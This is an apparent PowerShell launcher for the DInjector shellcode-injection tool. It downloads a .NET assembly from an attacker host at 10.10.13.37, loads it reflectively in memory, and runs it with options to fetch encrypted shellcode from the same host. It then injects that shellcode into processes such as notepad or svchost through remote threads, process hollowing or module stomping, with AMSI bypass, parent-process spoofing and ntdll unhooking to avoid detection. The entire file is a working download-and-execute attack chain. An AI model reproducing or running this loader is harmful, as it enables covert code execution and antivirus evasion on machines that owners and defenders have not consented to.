<#
.DESCRIPTION

Module name. Choose from:
  
  "functionpointer",
  "functionpointerv2",
  "clipboardpointer",
  "currentthread",
  "currentthreaduuid",
  "remotethread",
  "remotethreaddll",
  "remotethreadview",
  "remotethreadsuspended",
  "remotethreadkernelcb",
  "remotethreadapc",
  "remotethreadcontext",
  "processhollowing",
  "modulestomping"
#>
$A = "currentthread"

# lhost
$B = "10.10.13.37"

# lport
$C = 80

# injector filename
$D = "DInjector.dll"

# encrypted shellcode filename
$E = "enc"

# password to decrypt the shellcode
$F = "Passw0rd!"

# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$G = "C:\Windows\System32\svchost.exe"

# existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended" and "remotethreadkernelcb")
$H = "notepad"

# parent process name to spoof the original value (use "0" to disable PPID spoofing) (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$I = "explorer"

# loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
$J = "msvcp_win.dll"

# name of the module (DLL) to stomp (used in "modulestomping")
$K = "xpsservices.dll"

# exported function name to overwrite (used in "modulestomping")
$L = "DllCanUnloadNow"

# number of seconds (approx.) to sleep before execution to evade potential in-memory scan (for values greater than "60" it will take much longer to sleep)
$M = "0"

# block 3rd-party DLLs ("True" / "False") (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$N = "True"

# bypass AMSI ("True" / "False")
$O = "True"

# unhook ntdll.dll ("True" / "False")
$P = "False"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended", "remotethreadkernelcb")
if ($methods.Contains($A)) {
    $H = (Start-Process -WindowStyle Hidden -PassThru $H).Id
}

$methods = @("remotethreadapc", "remotethreadcontext", "processhollowing", "modulestomping")
if ($methods.Contains($A)) {
    try {
        $I = (Get-Process $I -ErrorAction Stop).Id
        # if multiple processes exist with the same name, arbitrary select the first one
        if ($I -is [array]) {
            $I = $I[0]
        }
    }
    catch {
        $I = 0
    }
}

$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /stomp:${K} /export:${L} /sleep:${M} /blockDlls:${N} /am51:${O} /unhook:${P}"

$data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "Public,NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd))
